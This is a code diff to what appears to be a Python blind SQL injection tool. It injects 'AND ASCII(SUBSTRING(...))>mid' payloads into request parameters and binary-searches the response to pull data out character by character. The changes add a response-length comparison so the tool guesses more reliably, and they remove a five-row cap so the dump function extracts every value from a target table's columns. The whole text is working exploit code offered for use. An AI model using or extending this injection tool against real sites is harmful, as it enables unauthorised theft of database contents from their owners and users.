@@ -1,5 +1,10 @@
 import requests
 
+
+def ecart(a, b):
+    x = abs(a-b) / b * 100
+    return x
+    
 def send(url, params, method):
     if(method == "GET"):
         gurl =  requests.get(url.geturl(), params=params)
@@ -12,8 +17,10 @@ def bsearch_req(ctx, expression, mid, i):
     payload = f" AND ASCII(SUBSTRING({expression},{i},1))>{mid}"
     copy = ctx.params.copy()
     copy[ctx.name] = ctx.params[ctx.name][0] + payload
-    r = send(ctx.url, copy, ctx.method)
-    return 1 if r.status_code == 200 else 0
+    copy_r = send(ctx.url, copy, ctx.method)
+    if(copy_r.status_code == 200 and (ecart(ctx.len, len(copy_r.text)) < 10)):
+        return 1
+    return 0
     
 def bsearch(ctx, expression, i):
     lo = 0
@@ -80,7 +87,7 @@ def dump(ctx, table, columns, engine):
     result = {}
     for c in columns:
         values = [""]
-        for i in range(1, 6):
+        while True:
             seen = ",".join(f"'{v}'" for v in values)
             v = extract(ctx,engine["value"].format(c=c, t=table, seen=seen))
             if v == "":
